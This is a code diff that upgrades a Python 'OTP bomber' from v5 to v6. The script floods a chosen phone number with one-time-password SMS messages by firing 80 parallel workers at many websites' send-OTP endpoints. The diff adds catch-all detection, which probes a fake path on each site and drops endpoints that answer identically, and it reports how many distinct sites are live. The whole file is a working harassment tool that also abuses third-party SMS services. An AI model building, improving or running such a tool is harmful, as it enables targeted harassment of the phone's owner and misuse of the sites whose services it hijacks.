@@ -1,22 +1,21 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-OTP BOMBER v5
+OTP BOMBER v6
 =============
-Enter phone number -> enter rounds -> done.
+New in v6:
+  * catch-all detection: a fake path is requested first; any endpoint that
+    answers exactly like the fake path is dropped
+  * LIVE summary now shows how many DIFFERENT sites are live
 
 New in v5:
-  * verdict() honest: HTML page is not an API (kills catch-all false positives)
-  * 429 is "throttled" and retried, not counted as success
-  * captcha detected
-  * {phone_local} placeholder -> sends 0501234567 for sites that want local format
-  * per-endpoint cooldown (COOLDOWN)
+  * honest verdict (HTML page is not an API), 429 throttled + retried
+  * {phone_local} placeholder
 
 sites.txt line format:
     https://site.com/api/send-otp|POST|{"phone":"{phone}"}
     https://site.com/customer/ajax/post/|POST|telephone={phone_local}
-    site.com|/api/auth/otp            (tool hunts the rest)
-    domain.com                        (tool hunts everything)
+    domain.com
 """
 
 import json
@@ -36,9 +35,9 @@ WORKERS       = 80
 ROUND_SECONDS = 30
 TIMEOUT       = 10
 COUNTRY_CODE  = "972"
-PROBE_LIMIT   = 40      # must be >= len(PROBE_PATHS)
-COOLDOWN      = 1.0     # seconds between two requests to the SAME endpoint
-LOCAL_PHONE   = ""      # filled at runtime, e.g. 0501234567
+PROBE_LIMIT   = 40
+COOLDOWN      = 1.0
+LOCAL_PHONE   = ""
 
 UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36")
@@ -76,10 +75,11 @@ BAD_WORDS = ('"error"', '"success":false', '"status":false', '"ok":false',
 OTP_WORDS = ("otp", "verification code", "one time", "one-time",
              "send sms", "sent", "verification")
 
+BASELINE = {}
+
 
 # ----------------- helpers -----------------
 def norm_phones(raw):
-    """returns international variants, most likely first"""
     p = re.sub(r"[^\d]", "", raw)
     if p.startswith(COUNTRY_CODE):
         intl = p
@@ -88,6 +88,11 @@ def norm_phones(raw):
     else:
         intl = COUNTRY_CODE + p if len(p) <= 9 else p
     return [intl, "+" + intl]
+
+
+def host_of(url):
+    m = re.match(r"https?://[^/]+", url)
+    return m.group(0) if m else url
 
 
 _local = threading.local()
@@ -102,10 +107,7 @@ def sess():
 
 
 def headers_for(url):
-    try:
-        base = re.match(r"https?://[^/]+", url).group(0)
-    except Exception:
-        base = url
+    base = host_of(url)
     return {
         "User-Agent": UA,
         "Accept": "application/json, text/plain, */*",
@@ -120,8 +122,21 @@ def headers_for(url):
     }
 
 
+def baseline_for(host):
+    """מה האתר מחזיר לכתובת שלא קיימת בכלל"""
+    for p in ("/api/__nope__xyz", "/__nope__xyz", "/api/v9/__nope__xyz"):
+        u = host + p
+        try:
+            r = sess().post(u, data=('{"phone":"%s"}' % PHONES[0]).encode(),
+                            headers=headers_for(u), timeout=TIMEOUT)
+        except Exception:
+            continue
+        if r.status_code == 200:
+            return (r.status_code, (r.text or "")[:4000])
+    return None
+
+
 def parse_line(line):
-    """-> list of dicts(url, method, payload) or None"""
     parts = [x.strip() for x in line.split("|")]
     first = parts[0]
     if not first:
@@ -198,8 +213,7 @@ def fire(ep, phone):
         return None
 
 
-def verdict(r):
-    """live = really sent | maybe = endpoint exists | dead = nothing there"""
+def verdict(r, base=None):
     if r is None:
         return "dead"
     c = r.status_code
@@ -212,6 +226,13 @@ def verdict(r):
 
     if c == 429:
         return "throttled"
+
+    # --- זהה לתשובת הדמה? זה catch-all ---
+    if base is not None and base[0] == c:
+        b = base[1]
+        if abs(len(body) - len(b)) < 40 and body[:150] == b[:150]:
+            return "dead"
+
     if "captcha" in low or "recaptcha" in low:
         return "maybe"
     if c in (400, 401, 403, 422):
@@ -219,7 +240,6 @@ def verdict(r):
     if not (200 <= c < 300):
         return "dead"
 
-    # big HTML page = the site's homepage / SPA catch-all
     if "html" in ct:
         if len(body) > 1500:
             return "dead"
@@ -239,13 +259,23 @@ def discover(entries):
     alive, near = [], []
     done = 0
     total = len(entries)
-    print(f"\n[*] Testing {total} endpoints...\n")
+    hosts = sorted({host_of(e["url"]) for e in entries})
+
+    print(f"\n[*] {total} endpoints on {len(hosts)} different sites.")
+    print("[*] checking which sites answer the same to everything...")
+    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
+        res = list(ex.map(baseline_for, hosts))
+    for h, r in zip(hosts, res):
+        if r is not None:
+            BASELINE[h] = r
+    print(f"[*] {len(BASELINE)} sites flagged. Now testing {total} endpoints...\n")
     t0 = time.time()
 
     def check(ep):
+        base = BASELINE.get(host_of(ep["url"]))
         for ph in phones:
             for attempt in range(3):
-                v = verdict(fire(ep, ph))
+                v = verdict(fire(ep, ph), base)
                 if v == "throttled" and attempt < 2:
                     time.sleep(2.5)
                     continue
@@ -264,11 +294,12 @@ def discover(entries):
             if kind == "LIVE":
                 alive.append({**ep, "phone": ph})
                 print(f"  + {ep['url']}")
-            if done % 50 == 0:
+            if done % 100 == 0:
                 print(f"    ... {done}/{total}  ({time.time() - t0:.0f}s)")
 
-    print(f"\n[*] LIVE: {len(alive)}   |   near-miss: {len(near)}   "
-          f"|   {time.time() - t0:.0f}s\n")
+    n_hosts = len({host_of(e["url"]) for e in alive})
+    print(f"\n[*] LIVE: {len(alive)}  on {n_hosts} DIFFERENT SITES   "
+          f"|   near-miss: {len(near)}   |   {time.time() - t0:.0f}s\n")
     if alive:
         with open(ALIVE_FILE, "w", encoding="utf-8") as f:
             json.dump(alive, f, ensure_ascii=False, indent=1)
@@ -345,7 +376,7 @@ def run_round(endpoints, budget):
 
 def main():
     print("=" * 56)
-    print("               O T P   B O M B E R   v5")
+    print("               O T P   B O M B E R   v6")
     print("=" * 56)
 
     if not os.path.exists(SITES_FILE):
@@ -372,8 +403,9 @@ def main():
         try:
             with open(ALIVE_FILE, encoding="utf-8") as f:
                 alive = json.load(f)
-            print(f"[*] Reusing last scan: {len(alive)} live endpoints "
-                  f"(delete alive.json to rescan)")
+            n_hosts = len({host_of(e["url"]) for e in alive})
+            print(f"[*] Reusing last scan: {len(alive)} endpoints on "
+                  f"{n_hosts} sites (delete alive.json to rescan)")
         except Exception:
             alive = None
 
